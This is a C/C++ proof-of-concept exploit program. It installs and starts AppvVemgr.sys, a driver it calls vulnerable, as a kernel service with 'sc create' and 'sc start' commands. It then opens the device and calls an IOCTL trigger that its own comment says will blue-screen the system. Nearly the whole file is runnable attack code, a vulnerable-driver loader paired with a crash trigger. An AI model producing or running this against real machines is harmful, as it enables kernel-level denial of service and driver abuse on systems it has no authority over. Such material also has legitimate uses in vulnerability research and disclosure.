#include "ioctl.h"


// Global variables:
const char* DeviceName = "\\Device\\AppvVemgr";
const char* SymbolicLink = "\\\\.\\AppvVemgr";
const char* VulnFileName = "AppvVemgr.sys";
char VulnPath[1024] = { 0 };
HANDLE DriverHandle = INVALID_HANDLE_VALUE;


DWORD LoadVulnurableDriver(const char* FileName) {
    char CreateCommand[1024] = { 0 };
    DWORD VulnPathLength = ERROR_SUCCESS;


    // Get path of vulnurable driver and configure and start the service:
    VulnPathLength = GetFullPathNameA(FileName, sizeof(VulnPath), VulnPath, NULL);
    if (VulnPathLength == 0) {
        DeleteFileA(FileName);
        return GetLastError();
    }
    strcat_s(CreateCommand, "sc create DriverPoC type=kernel start=auto binPath=");
    strcat_s(CreateCommand, VulnPath);
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
    system(CreateCommand);
    system("sc start DriverPoC");
    return ERROR_SUCCESS;
}


void UnloadVulnurableDriver(const char* FileName) {
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
}
int main() {
    HANDLE DriverHandle = INVALID_HANDLE_VALUE;
    DWORD LastError = 0;
    BOOL AlreadyLoaded = FALSE;


    // Get handle to driver and check if driver is already loaded:
    DriverHandle = CreateFileA(SymbolicLink, GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle != INVALID_HANDLE_VALUE) {
        printf("[+] Driver %s already exists before loading - %d\n", SymbolicLink, (DWORD)DriverHandle);
        AlreadyLoaded = TRUE;
        goto ExploitLabel;
    }


    // Load driver into file and create service:
    LastError = LoadVulnurableDriver(VulnFileName);
    if (LastError != ERROR_SUCCESS) {
        LastError = GetLastError();
        printf("[-] Failed to load driver %s into file and create service: %d\n", SymbolicLink, LastError);
        return FALSE;
    }


    // Get handle to driver and check if driver is already loaded:
    DriverHandle = CreateFileA(SymbolicLink, GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        LastError = GetLastError();
        printf("[-] Failed to get handle to driver %s: %d\n", SymbolicLink, LastError);
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[+] Got handle to driver %s - %d\n", SymbolicLink, (DWORD)DriverHandle);


    // Call exploit to BSoD the system:
    ExploitLabel:
    LastError = IoctlTriggers::TriggerUnfilteredStatus(DriverHandle);
    if (LastError != ERROR_SUCCESS) {
        if (!AlreadyLoaded) {
            UnloadVulnurableDriver(VulnFileName);
        }
        return FALSE;
    }
    if (!AlreadyLoaded) {
        UnloadVulnurableDriver(VulnFileName);
    }
    return TRUE;
}